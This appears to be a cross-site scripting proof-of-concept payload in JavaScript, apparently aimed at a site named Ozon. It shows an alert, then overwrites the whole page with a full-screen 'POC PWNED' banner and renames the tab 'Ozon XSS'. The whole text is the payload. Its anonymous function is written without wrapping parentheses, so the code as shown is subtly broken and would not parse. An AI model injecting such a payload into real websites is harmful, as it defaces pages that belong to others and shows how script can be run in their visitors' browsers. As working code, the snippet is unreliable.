alert('new_5');

function(){
    setTimeout(function(){
        document.body.innerHTML = '<div style="background: #2b2b2b; color: #fff; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; position:fixed; top:0; left:0; width:100%; z-index:9999;"><div><h1>POC PWNED</h1><p>Test</p></div></div>';
        document.title = 'Ozon XSS';
    }, 0);
}();void(0);
